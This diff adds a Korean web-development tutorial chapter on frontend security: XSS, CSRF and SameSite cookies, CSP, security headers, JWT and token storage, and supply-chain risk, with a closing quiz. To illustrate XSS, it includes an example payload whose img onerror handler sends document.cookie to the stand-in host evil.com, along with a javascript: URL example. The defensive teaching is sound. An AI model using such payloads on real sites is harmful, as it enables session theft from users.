@@ -1,0 +1,391 @@
+<!--desc: XSS·CSRF·클릭재킹 등 프론트엔드 보안 위협과 방어법, CSP, 인증 방식, 의존성 보안까지 실무 기준으로 정리합니다.-->
+
+<div class="ch-goals">
+<h2>이 챕터에서 배우는 것</h2>
+<ul>
+  <li><b>XSS</b> — 가장 흔하고 가장 위험한 웹 취약점</li>
+  <li><b>CSRF</b>와 <code>SameSite</code> 쿠키</li>
+  <li><b>CSP</b>로 방어선 하나 더 만들기</li>
+  <li>인증 방식과 <b>토큰 저장 위치</b></li>
+  <li>의존성 보안과 실수로 인한 정보 노출</li>
+</ul>
+</div>
+
+<div class="box tip">
+<p class="box-title"><span class="box-ico">🛡️</span> 이 챕터의 전제</p>
+<p style="margin-bottom:0">여기서 다루는 것은 <b>여러분이 만드는 서비스를 지키는 방법</b>입니다.
+공격 기법은 <b>왜 그 방어가 필요한지 이해하기 위해</b>서만 설명합니다.<br>
+그리고 <b>보안의 대부분은 서버의 책임</b>입니다. 하지만 프론트엔드만이 막을 수 있는 것들이 있고,
+프론트엔드의 실수로 서버의 방어가 무력화되기도 합니다.</p>
+</div>
+
+<p class="ch-meta">읽는 데 약 26분</p>
+
+<h2 id="principle">첫 번째 원칙</h2>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">🔓</span> 클라이언트에서 오는 것은 <b>아무것도 믿을 수 없습니다</b></p>
+<p style="margin-bottom:0">1장부터 반복한 원칙입니다. 프론트엔드 코드는 <b>전부 사용자 손에</b> 있습니다.</p>
+<ul style="margin-bottom:0">
+<li>JavaScript를 <b>수정</b>할 수 있습니다</li>
+<li>API를 브라우저 없이 <b>직접 호출</b>할 수 있습니다</li>
+<li>모든 요청 값을 <b>조작</b>할 수 있습니다</li>
+<li>숨긴 버튼·비활성 버튼·라우트 가드는 <b>아무 보호도 되지 않습니다</b>(68·72장)</li>
+</ul>
+<p style="margin-bottom:0"><b>프론트엔드 검증은 사용성, 백엔드 검증은 보안</b>입니다(9장).</p>
+</div>
+
+<h2 id="xss">XSS — 교차 사이트 스크립팅</h2>
+
+<p><b>공격자의 스크립트가 내 사이트에서 실행되는</b> 취약점입니다.
+그 순간 그 스크립트는 <b>내 사이트의 권한을 그대로</b> 갖습니다.</p>
+
+<div class="codeblock">
+<span class="cb-label">어떻게 발생하는가</span>
+<pre><code data-lang="js">// 사용자가 댓글에 이렇게 입력했다면
+const comment = '&lt;img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)"&gt;';
+
+element.innerHTML = comment;    // ☠️ 실제로 실행됩니다 (38장)</code></pre>
+</div>
+
+<div class="tablewrap">
+<table>
+<thead><tr><th>공격자가 할 수 있는 것</th></tr></thead>
+<tbody>
+<tr><td>쿠키·<code>localStorage</code>의 <b>토큰 탈취</b>(39장)</td></tr>
+<tr><td>사용자 대신 <b>요청 전송</b> (송금, 비밀번호 변경)</td></tr>
+<tr><td><b>가짜 로그인 폼</b> 표시</td></tr>
+<tr><td>키 입력 기록, 화면 내용 전송</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3 id="xss-defense">방어</h3>
+
+<div class="codeblock">
+<span class="cb-label">① 출력 시 이스케이프 — 가장 근본적인 방어</span>
+<pre><code data-lang="js">// ❌
+element.innerHTML = userInput;
+
+// ✅ 텍스트로만 취급합니다 (6·38장)
+element.textContent = userInput;</code></pre>
+</div>
+
+<div class="box tip">
+<p class="box-title"><span class="box-ico">⚛️</span> React는 기본적으로 안전합니다</p>
+<div class="codeblock" style="margin:.6em 0 0">
+<pre><code data-lang="jsx">&lt;div&gt;{userInput}&lt;/div&gt;
+// React가 자동으로 이스케이프합니다. &lt;script&gt;는 글자로 표시될 뿐입니다.
+
+// ⚠️ 이것만 위험합니다 — 이름부터 경고입니다
+&lt;div dangerouslySetInnerHTML={{ __html: userInput }} /&gt;</code></pre>
+</div>
+<p style="margin-bottom:0">6장에서 배운 <b>문자 엔티티</b>가 여기서 의미를 갖습니다.
+React가 <code>&lt;</code>를 <code>&amp;lt;</code>로 바꿔 주기 때문에 안전한 것입니다.</p>
+</div>
+
+<div class="codeblock">
+<span class="cb-label">② HTML을 꼭 허용해야 한다면 정화</span>
+<pre><code data-lang="js">import DOMPurify from "dompurify";
+
+const clean = DOMPurify.sanitize(userHtml, {
+  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
+  ALLOWED_ATTR: ["href"]
+});
+element.innerHTML = clean;</code></pre>
+</div>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">🚫</span> 직접 필터를 만들지 마세요</p>
+<p style="margin-bottom:0"><code>&lt;script&gt;</code>만 제거하면 될 것 같지만
+<code>&lt;img onerror&gt;</code>, <code>&lt;svg onload&gt;</code>, <code>javascript:</code> URL,
+대소문자 변형, 인코딩 우회 등 <b>수십 가지 경로</b>가 있습니다.
+42장에서 말한 대로 <b>정규식으로 HTML을 다루려는 시도는 거의 항상 뚫립니다.</b>
+검증된 라이브러리를 쓰세요.</p>
+</div>
+
+<div class="codeblock">
+<span class="cb-label">③ 위험한 다른 통로들</span>
+<pre><code data-lang="jsx">// URL — javascript: 스킴 주의
+&lt;a href={userUrl}&gt;링크&lt;/a&gt;
+// userUrl이 "javascript:alert(1)" 이면 클릭 시 실행됩니다
+// ✅ 프로토콜을 검사하세요
+const safe = /^https?:\/\//.test(userUrl) ? userUrl : "#";
+
+// 절대 하지 말 것
+eval(userInput);
+new Function(userInput);
+element.setAttribute("onclick", userInput);</code></pre>
+</div>
+
+<h2 id="csrf">CSRF — 교차 사이트 요청 위조</h2>
+
+<div class="codeblock">
+<span class="cb-label">동작 원리</span>
+<pre><code data-lang="text">① 사용자가 은행 사이트에 로그인한 상태 (쿠키 있음)
+② 공격자의 페이지에 방문
+③ 그 페이지가 은행 API로 요청을 보냄
+④ 브라우저가 쿠키를 '자동으로' 붙임 (4장)
+⑤ 서버는 정상 요청으로 처리 → 송금 실행</code></pre>
+</div>
+
+<div class="box tip">
+<p class="box-title"><span class="box-ico">🍪</span> 원인은 <b>쿠키의 자동 전송</b>입니다</p>
+<p style="margin-bottom:0">4장에서 배운 "브라우저가 쿠키를 자동으로 붙인다"는 편리함이
+<b>그대로 취약점</b>이 됩니다. 공격자는 <b>응답을 읽을 필요도 없습니다.</b>
+요청이 실행되기만 하면 되기 때문에 <b>CORS로 막히지 않습니다</b>(37장).</p>
+</div>
+
+<div class="codeblock">
+<span class="cb-label">방어 — 서버 설정이지만 알아야 합니다</span>
+<pre><code data-lang="text">Set-Cookie: session=abc;
+  HttpOnly;              JS가 읽을 수 없음 (XSS 대비)
+  Secure;                HTTPS에서만 전송
+  SameSite=Lax;          다른 사이트에서 시작된 요청에는 대체로 전송 안 됨</code></pre>
+</div>
+
+<div class="tablewrap">
+<table>
+<thead><tr><th><code>SameSite</code></th><th>동작</th></tr></thead>
+<tbody>
+<tr><td><code>Strict</code></td><td>다른 사이트에서 온 요청에 <b>절대</b> 전송 안 함. 안전하지만 외부 링크로 들어오면 로그아웃처럼 보입니다</td></tr>
+<tr><td><b><code>Lax</code></b></td><td>일반적인 <b>링크 이동(GET)</b>에는 전송, <b>POST 등에는 전송 안 함</b>. <b>현대 브라우저의 기본값</b></td></tr>
+<tr><td><code>None</code></td><td>항상 전송. <b><code>Secure</code>가 필수</b>이며 CSRF에 노출됩니다</td></tr>
+</tbody>
+</table>
+</div>
+
+<p>추가로 <b>CSRF 토큰</b>(폼에 예측 불가능한 값을 넣고 서버가 검증)을 함께 쓰는 것이 표준입니다.
+또 <b>상태를 바꾸는 요청에 GET을 쓰지 않는 것</b>(4장)이 기본 전제입니다.</p>
+
+<h2 id="csp">CSP — 콘텐츠 보안 정책</h2>
+
+<div class="codeblock">
+<pre><code data-lang="text">Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://trusted-cdn.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  frame-ancestors 'none';</code></pre>
+</div>
+
+<div class="box tip">
+<p class="box-title"><span class="box-ico">🧱</span> 두 번째 방어선</p>
+<p style="margin-bottom:0">CSP는 <b>"이 출처의 스크립트만 실행하라"</b>고 브라우저에 지시합니다.
+XSS가 발생하더라도 <b>공격자의 스크립트가 실행되지 못하게</b> 막을 수 있습니다.<br>
+<b>XSS를 막는 것이 1차 방어이고, CSP는 그것이 실패했을 때의 2차 방어</b>입니다.
+"CSP를 켰으니 <code>innerHTML</code>을 써도 된다"는 잘못된 생각입니다.</p>
+</div>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">⚠️</span> <code>'unsafe-inline'</code>은 방어를 크게 약화시킵니다</p>
+<p style="margin-bottom:0">인라인 스크립트를 허용하면 XSS 방어 효과가 대부분 사라집니다.
+<b>nonce</b>나 <b>해시</b> 기반으로 특정 인라인 스크립트만 허용하는 것이 권장됩니다.<br>
+도입할 때는 <b><code>Content-Security-Policy-Report-Only</code></b>로 먼저 켜서
+<b>무엇이 차단될지 보고</b>한 뒤 실제 적용하는 것이 안전합니다.
+바로 켜면 사이트가 동작하지 않을 수 있습니다.</p>
+</div>
+
+<h2 id="headers">기타 보안 헤더</h2>
+<div class="tablewrap">
+<table>
+<thead><tr><th>헤더</th><th>막는 것</th></tr></thead>
+<tbody>
+<tr><td><code>Strict-Transport-Security</code></td><td>HTTP 접속 자체를 차단. 항상 HTTPS로</td></tr>
+<tr><td><code>X-Content-Type-Options: nosniff</code></td><td>브라우저가 <code>Content-Type</code>을 무시하고 추측하는 것을 막습니다(4장)</td></tr>
+<tr><td><code>frame-ancestors</code> (CSP) 또는 <code>X-Frame-Options</code></td><td><b>클릭재킹</b> — 내 사이트를 투명한 iframe에 넣고 사용자를 속이는 공격</td></tr>
+<tr><td><code>Referrer-Policy</code></td><td>다른 사이트로 이동할 때 <b>현재 주소가 새어 나가는 것</b></td></tr>
+</tbody>
+</table>
+</div>
+
+<h2 id="auth">인증</h2>
+
+<div class="tablewrap">
+<table>
+<thead><tr><th>방식</th><th>동작</th><th>특징</th></tr></thead>
+<tbody>
+<tr><td><b>세션 쿠키</b></td><td>서버가 세션을 저장, 쿠키에는 식별자만</td><td><b>서버에서 즉시 무효화 가능</b>. <code>HttpOnly</code>로 안전하게</td></tr>
+<tr><td><b>JWT</b></td><td>토큰 자체에 정보가 들어 있고 서명으로 검증</td><td>서버가 상태를 안 가져도 됨. <b>만료 전에 취소하기 어려움</b></td></tr>
+<tr><td><b>OAuth / 소셜 로그인</b></td><td>다른 서비스에 인증을 위임</td><td>비밀번호를 다루지 않아도 됩니다</td></tr>
+</tbody>
+</table>
+</div>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">🔑</span> JWT에 대한 흔한 오해</p>
+<ul style="margin-bottom:0">
+<li><b>JWT는 암호화되지 않습니다.</b> Base64로 인코딩되었을 뿐이라 <b>누구나 내용을 볼 수 있습니다.</b>
+비밀 정보를 넣으면 안 됩니다.</li>
+<li><b>서명은 위조를 막을 뿐</b> 읽는 것을 막지 않습니다.</li>
+<li><b>로그아웃이 어렵습니다.</b> 발급된 토큰은 만료까지 유효하므로
+별도의 차단 목록이나 짧은 만료 + 리프레시 토큰 구조가 필요합니다.</li>
+</ul>
+</div>
+
+<div class="box tip">
+<p class="box-title"><span class="box-ico">💾</span> 토큰 저장 위치 — 39장의 결론</p>
+<div class="tablewrap" style="margin:.6em 0 0">
+<table>
+<thead><tr><th>위치</th><th>XSS</th><th>CSRF</th></tr></thead>
+<tbody>
+<tr><td><code>localStorage</code></td><td><b>매우 취약</b> — 스크립트가 그대로 읽음</td><td>안전</td></tr>
+<tr><td><b><code>HttpOnly</code> 쿠키</b></td><td><b>훨씬 안전</b></td><td><code>SameSite</code>로 완화</td></tr>
+</tbody>
+</table>
+</div>
+<p style="margin-bottom:0"><b>가능하면 <code>HttpOnly</code> 쿠키</b>입니다.
+어느 쪽을 쓰든 <b>XSS를 막는 것이 근본</b>이고, 저장 위치는 피해 범위를 줄일 뿐입니다.</p>
+</div>
+
+<h2 id="leak">실수로 인한 정보 노출</h2>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">💧</span> 실제로 자주 일어나는 사고들</p>
+<ul style="margin-bottom:0">
+<li><b>API 키를 프론트엔드 코드에</b> — 1·47·74장에서 반복한 그것입니다</li>
+<li><b><code>.env</code>를 커밋</b> — Git 이력에 영구히 남습니다(45장). <b>키를 폐기하고 재발급</b>이 유일한 대응입니다</li>
+<li><b>과도한 API 응답</b> — 화면에 이름만 쓰는데 서버가 <b>비밀번호 해시·주민번호까지</b> 보내는 경우.
+개발자 도구로 다 보입니다(49장)</li>
+<li><b>오류 메시지에 내부 정보</b> — 스택 트레이스, SQL, 서버 경로(33장)</li>
+<li><b>소스맵 공개</b> — 원본 코드와 주석이 그대로 노출됩니다(47장)</li>
+<li><b>주석에 남긴 계정 정보</b>(6장)</li>
+</ul>
+</div>
+
+<h2 id="deps">의존성 보안</h2>
+
+<div class="codeblock">
+<pre><code data-lang="bash">npm audit                 # 알려진 취약점 확인 (46장)
+npm audit fix</code></pre>
+</div>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">🕸️</span> 공급망 공격</p>
+<p style="margin-bottom:0">46장에서 말했듯 패키지 3개를 설치하면 <b>수백 개가 따라옵니다.</b>
+그중 하나가 탈취되면 <b>여러분의 앱에 악성 코드가 들어옵니다.</b>
+실제로 널리 쓰이는 패키지가 악성 코드로 교체된 사건이 여러 차례 있었습니다.</p>
+<ul style="margin-bottom:0">
+<li><b>lock 파일을 커밋</b>하고 CI에서 <code>npm ci</code>를 씁니다(46장)</li>
+<li><b>의존성을 최소화</b>합니다. 20줄짜리 기능에 패키지를 넣지 마세요</li>
+<li><b>자동 업데이트 도구</b>(Dependabot 등)로 보안 패치를 놓치지 않습니다</li>
+<li>설치 전 <b>다운로드 수·최근 배포일·이슈 대응</b>을 확인합니다</li>
+</ul>
+</div>
+
+<div class="box field">
+<p class="box-title"><span class="box-ico">🛠️</span> 현장 노트 — 프론트엔드 보안 체크리스트</p>
+<ol>
+<li><b>사용자 입력을 <code>innerHTML</code>·<code>dangerouslySetInnerHTML</code>에 넣지 않는다</b></li>
+<li>꼭 필요하면 <b>DOMPurify로 정화</b>한다</li>
+<li>사용자가 준 URL은 <b>프로토콜을 검사</b>한다</li>
+<li><b>비밀 키를 프론트엔드에 두지 않는다.</b> 서버를 경유한다</li>
+<li>토큰은 <b><code>HttpOnly</code>·<code>Secure</code>·<code>SameSite</code></b> 쿠키에</li>
+<li><b>CSP를 설정</b>한다 (Report-Only로 시작)</li>
+<li><b>HTTPS를 강제</b>한다</li>
+<li><b>API 응답에 불필요한 필드가 없는지</b> 확인한다 (백엔드와 협의)</li>
+<li><b>오류 메시지에 내부 정보를 노출하지 않는다</b></li>
+<li><b>의존성을 주기적으로 점검</b>한다</li>
+<li><b>서버에서도 모든 검증과 권한 확인</b>을 한다</li>
+</ol>
+<p style="margin-bottom:0"><b>완벽한 보안은 없습니다.</b>
+목표는 <b>방어를 여러 겹으로 쌓아</b> 하나가 뚫려도 피해가 제한되게 만드는 것입니다.
+그리고 <b>모르는 것을 아는 척하지 마세요.</b>
+보안은 <b>확실하지 않으면 물어보는 것</b>이 가장 중요한 태도입니다.</p>
+</div>
+
+<div class="box recap">
+<p class="box-title"><span class="box-ico">📌</span> 요약</p>
+<ul style="margin-bottom:0">
+<li><b>클라이언트에서 오는 것은 아무것도 믿을 수 없다.</b> 서버가 반드시 다시 검증한다.</li>
+<li><b>XSS</b>는 사용자 입력을 HTML로 해석할 때 생긴다. <b><code>textContent</code></b>가 기본.</li>
+<li>React는 기본적으로 이스케이프한다. <code>dangerouslySetInnerHTML</code>만 위험하다.</li>
+<li><b>정화 필터를 직접 만들지 않는다.</b> DOMPurify를 쓴다.</li>
+<li><b>CSRF</b>는 쿠키 자동 전송이 원인이다. <code>SameSite</code> + CSRF 토큰으로 막는다.</li>
+<li><b>CSP는 2차 방어선</b>이다. Report-Only로 먼저 확인하고 적용한다.</li>
+<li><b>JWT는 암호화가 아니다.</b> 누구나 내용을 볼 수 있다.</li>
+<li>토큰은 <b><code>HttpOnly</code> 쿠키</b>가 더 안전하다.</li>
+<li><b>커밋된 비밀 키는 폐기·재발급</b>이 유일한 대응이다.</li>
+<li>의존성도 공격 경로다. <b>최소화하고 주기적으로 점검</b>한다.</li>
+</ul>
+</div>
+
+<h2 id="refs">참고 자료</h2>
+<ul>
+<li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10</a> — 가장 널리 참조되는 웹 취약점 목록</li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — XSS 방어 치트시트</a></li>
+<li><a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Guides/CSP" target="_blank" rel="noopener">MDN — 콘텐츠 보안 정책(CSP)</a></li>
+<li><a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Reference/Headers/Set-Cookie/SameSite" target="_blank" rel="noopener">MDN — SameSite 쿠키</a></li>
+<li><a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">DOMPurify</a></li>
+</ul>
+
+<script data-quiz>
+FB_QUIZ([
+  {
+    q: "React에서 <code>&lt;div&gt;{userInput}&lt;/div&gt;</code> 가 XSS로부터 안전한 이유는?",
+    o: [
+      "React가 서버에서 검증하기 때문",
+      "React가 값을 자동으로 이스케이프해 텍스트로만 렌더링하기 때문. 위험한 것은 <code>dangerouslySetInnerHTML</code>뿐이다",
+      "React는 HTML을 사용하지 않기 때문",
+      "TypeScript가 막아 주기 때문"
+    ],
+    a: 1,
+    e: "React는 중괄호로 넣은 값의 <code>&lt;</code>·<code>&amp;</code> 등을 <b>문자 엔티티로 변환</b>합니다(6장). 그래서 <code>&lt;script&gt;</code>가 들어와도 글자로 표시될 뿐입니다. 이름이 길고 위험해 보이는 <code>dangerouslySetInnerHTML</code>은 <b>일부러 그렇게 지은 것</b>입니다."
+  },
+  {
+    q: "CSRF 공격이 CORS로 막히지 않는 이유는?",
+    o: [
+      "CORS는 오래된 기술이라서",
+      "공격자는 응답을 읽을 필요 없이 요청이 실행되기만 하면 되는데, 브라우저가 쿠키를 자동으로 붙여 서버가 정상 요청으로 처리하기 때문",
+      "CORS는 POST 요청에 적용되지 않아서",
+      "공격자가 CORS 헤더를 조작할 수 있어서"
+    ],
+    a: 1,
+    e: "CORS는 <b>응답을 JavaScript가 읽는 것</b>을 막습니다(37장). 하지만 송금 같은 동작은 <b>요청이 서버에 도달해 실행되면</b> 끝입니다. 응답을 못 읽어도 피해는 이미 발생합니다. 그래서 <code>SameSite</code> 쿠키와 CSRF 토큰이 필요합니다."
+  },
+  {
+    q: "JWT에 대한 설명으로 옳은 것은?",
+    o: [
+      "암호화되어 있어 내용을 볼 수 없다",
+      "Base64로 인코딩되었을 뿐이라 누구나 내용을 읽을 수 있다. 서명은 위조를 막을 뿐 열람을 막지 않는다",
+      "서버에서 언제든 즉시 무효화할 수 있다",
+      "쿠키에만 저장할 수 있다"
+    ],
+    a: 1,
+    e: "JWT의 payload는 <b>단순 인코딩</b>이라 브라우저 콘솔에서도 바로 디코딩됩니다. 비밀 정보를 넣으면 그대로 노출됩니다. 또 발급된 토큰은 <b>만료 전까지 유효</b>해 즉시 로그아웃시키기 어렵고, 짧은 만료 + 리프레시 토큰 구조가 필요합니다."
+  },
+  {
+    q: "실수로 API 키가 든 <code>.env</code>를 커밋해 푸시했습니다. 올바른 대응은?",
+    o: [
+      "다음 커밋에서 파일을 삭제한다",
+      "해당 키를 즉시 폐기하고 새로 발급받는다. Git 이력에 값이 남아 있으므로 삭제만으로는 유출을 되돌릴 수 없다",
+      "저장소를 비공개로 전환한다",
+      ".gitignore에 추가하면 해결된다"
+    ],
+    a: 1,
+    e: "45장에서 다룬 그대로입니다. Git은 <b>모든 이력을 보존</b>하므로 이후 커밋에서 지워도 과거 커밋에 남습니다. 공개 저장소라면 자동 스캐너가 몇 분 만에 수집합니다. <b>이미 유출된 것</b>으로 간주하고 폐기·재발급해야 합니다."
+  },
+  {
+    q: "CSP(콘텐츠 보안 정책)를 도입할 때 권장되는 순서는?",
+    o: [
+      "바로 적용하고 문제가 생기면 수정한다",
+      "<code>Content-Security-Policy-Report-Only</code>로 먼저 적용해 무엇이 차단될지 보고받은 뒤 실제 정책으로 전환한다",
+      "unsafe-inline을 허용해 두고 시작한다",
+      "CSP는 서버 담당이므로 프론트엔드는 신경 쓰지 않아도 된다"
+    ],
+    a: 1,
+    e: "CSP를 바로 켜면 <b>정상 스크립트까지 차단되어 사이트가 동작하지 않을 수</b> 있습니다. Report-Only 모드는 차단하지 않고 위반 사항만 보고하므로 안전하게 정책을 다듬을 수 있습니다. <code>'unsafe-inline'</code>을 허용하면 XSS 방어 효과가 대부분 사라집니다."
+  },
+  {
+    q: "사용자가 입력한 URL을 <code>&lt;a href={url}&gt;</code> 에 그대로 넣을 때의 위험은?",
+    o: [
+      "링크가 깨질 수 있다",
+      "<code>javascript:</code> 스킴이 들어오면 클릭 시 스크립트가 실행되므로, 프로토콜이 http/https인지 검사해야 한다",
+      "SEO에 나쁘다",
+      "위험하지 않다"
+    ],
+    a: 1,
+    e: "<code>href=\"javascript:...\"</code>는 클릭 시 코드를 실행합니다. React의 자동 이스케이프도 이 경우는 막아 주지 않습니다. 사용자가 제공한 URL은 <b>허용된 프로토콜만</b> 통과시키고 나머지는 무해한 값으로 대체해야 합니다."
+  }
+]);
+</script>
